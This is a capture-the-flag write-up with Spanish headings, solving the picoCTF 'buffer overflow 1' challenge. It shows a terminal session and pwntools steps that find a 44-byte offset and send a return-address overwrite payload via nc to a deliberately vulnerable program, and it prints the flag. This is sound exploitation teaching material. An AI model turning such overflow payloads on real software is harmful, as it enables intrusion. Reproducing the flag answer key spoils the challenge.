# buffer overflow 1
## Descripcipción
Control the return address
Additional details will be available after launching your challenge instance.

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/187/vuln).You can view source [here](https://artifacts.picoctf.net/c/187/vuln.c). And connect with it using `nc saturn.picoctf.net 55673`
## Pistas
- 
## Solucion
```
┌──(kali㉿kali)-[~/Documents/binary]
└─$ nc saturn.picoctf.net 56974
Please enter your string: 
sdjhkajshfkjdahfdfajhf ahafklahfd
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
┌──(kali㉿kali)-[~/Documents/binary]
└─$echo'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | nc saturn.picoctf.net 56974
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
┌──(kali㉿kali)-[~/Documents/binary]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 56974 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_0195a40f}                                                                            
┌──(kali㉿kali)-[~/Documents/binary]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 56974
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_0195a40f}  

------------------------------------------------------------------------------
								PYTHON
------------------------------------------------------------------------------
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 'A' *44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>>
```
## Bandera
picoCTF{addr3ss3s_ar3_3asy_0195a40f} 
## Notas adicionales
## Referencias
- https://www.youtube.com/watch?v=vVcGj3kIz-g&t=737s
